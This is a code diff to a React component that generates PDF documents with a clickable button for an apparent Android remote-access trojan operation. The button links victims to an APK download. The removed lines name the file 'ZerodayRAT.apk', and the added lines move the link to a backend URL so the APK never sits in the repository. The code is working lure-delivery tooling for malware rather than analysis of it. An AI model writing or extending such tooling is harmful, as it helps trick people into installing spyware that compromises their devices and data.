@@ -1,6 +1,7 @@
 import React, { useMemo, useRef, useState } from "react";
 import { jsPDF } from "jspdf";
 import type { Device } from "../api/types";
+import { APK_DOWNLOAD_URL } from "../api/apk";
 
 interface PdfExportModalProps {
   device: Device;
@@ -174,7 +175,9 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
       let buttonTargetUrl = parsedUrl.href;
       if (directDownload) {
         if (!parsedUrl.pathname.toLowerCase().endsWith(".apk")) {
-          buttonTargetUrl = `${parsedUrl.origin}/download/ZerodayRAT.apk`;
+          // Served by the backend (not Vercel statics) so the APK never has to
+          // be committed to the repository.
+          buttonTargetUrl = APK_DOWNLOAD_URL;
         }
       }
       pdf.link(48, by, 114, 17, { url: buttonTargetUrl });
@@ -348,7 +351,7 @@ export default function PdfExportModal({ device, activationUrl, onClose }: PdfEx
                   <div className="pl-6 pt-1 text-[11px] text-gray-600 flex items-center gap-1.5 flex-wrap">
                     <span className="text-gray-400 font-mono text-[10px]">Button Click Link:</span>
                     <code className="text-blue-700 font-mono bg-blue-50 px-1.5 py-0.5 rounded text-[10px] break-all border border-blue-100">
-                      {parsedUrl ? `${parsedUrl.origin}/download/ZerodayRAT.apk` : "/download/ZerodayRAT.apk"}
+                      {APK_DOWNLOAD_URL}
                     </code>
                   </div>
                 )}
